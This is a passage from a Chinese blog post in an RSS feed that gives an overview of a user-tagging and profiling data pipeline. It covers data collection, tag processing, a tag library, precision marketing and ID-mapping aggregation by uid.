&lt;p&gt;数据采集的渠道相对较多，比如同一APP内的各种业务线：购物、支付、理财、外卖、信息浏览等等。通过数据通道传输到统一的数据聚合平台。有了这些海量日志数据的支撑，才具有数据分析的基础条件。不管是数据智能，深度学习，算法等都是建立在海量数据的基础条件上，这样才能获取具有价值的分析结果。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数据加工&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;结合如上业务，通过对海量数据的加工，分析和提取，获取相对精准的用户标签，这里还有关键的一步，就是对已有的用户标签进行不断的验证和修复，尤其是规则类和拟合类的相关标签。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;标签库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过标签库，管理复杂的标签结果，除了复杂的标签，和基于时间线的标签变，标签数据到这里，已经具有相当大的价值，可以围绕标签库开放一些收费服务，例如常见的，用户在某电商APP浏览某些商品，可以在某信息流平台看到商品推荐。大数据时代就是这么令人感觉智能和窒息。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;标签业务&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;数据走了一大圈转换成标签，自然还是要回归到业务层面，通过对标签数据的用户的分析，可以进行精准营销，和智能推荐等相关操作，电商应用中可以提高成交量，信息流中可以更好的吸引用户。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;应用层&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;把上述业务开发成服务，集成到具有的应用层面，不断提升应用服务的质量，不断的吸引用户，提供服务。当然用户的数据不断在应用层面产生，在转到数据采集服务中，最终形成完整的闭环流程。&lt;/p&gt;
&lt;h2 id=&quot;2、数据聚合池&quot;&gt;2、数据聚合池&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;基于IDmapping技术，置换唯一标识[uid];&lt;/li&gt;
&lt;li&gt;基于uid关联标签，放入计算池；&lt;/li&gt;
&lt;li&gt;相同的uid携带的标签会以贪吃蛇的方式运行；&lt;/li&gt;
&lt;li&gt;不断丰富该uid下携带的标签内容；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;以此方式丰富标签的场景，产生更大的数据价值；&lt;/p&gt;

&lt;pre&gt;
&lt;code&gt;GitHub·地址
https://github.com/cicadasmile
GitEE·地址
https://gitee.com/cicadasmile
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;数据洞察系列文章&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推荐阅读：编程体系整理&lt;/strong&gt;&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Wed, 30 Dec 2020 15:50:00 +0000</pubDate>
<dc:creator>知了一笑</dc:creator>
<og:description>标签特点：精确描述定位和搜索，具有生命周期的特性，可以计算，配置和规则化处理。可以用标签来描述各种结构和非结构化[文档、图片、视频等]的数据，从而使这些内容被高效的管理。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/cicada-smile/p/14214191.html</dc:identifier>
</item>
</channel>
</rss>